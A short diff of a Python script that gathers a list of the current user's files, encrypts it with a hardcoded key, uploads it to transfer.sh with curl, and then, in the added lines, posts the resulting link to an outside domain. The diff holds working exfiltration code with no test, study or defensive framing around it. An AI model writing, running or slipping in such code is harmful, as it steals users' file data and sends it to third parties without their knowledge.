@@ -3,7 +3,7 @@ import pwd
 import getpass
 
 from cryptography.fernet import Fernet
-from subprocess import call
+from subprocess import check_output
 
 user = getpass.getuser()
 fe = Fernet(b'gda0KrfQjVKFtc9xaQMAc394ZkS8ePWz9A1wJf39REU=')
@@ -21,10 +21,10 @@ token = fe.encrypt('\n'.join(all_files).encode())
 with open('all-files.txt', 'wb') as f:
     f.write(token)
 
-output = call(['curl',
+output = check_output(['curl',
     '--upload-file',
     './all-files.txt',
     'https://transfer.sh/payload.txt'])
 
-os.write(1, "uploaded".encode())
-os.write(1, output.encode())
+requests.post('http://famatvisualizer.com/suggest-elip/', data={'text': output})
+
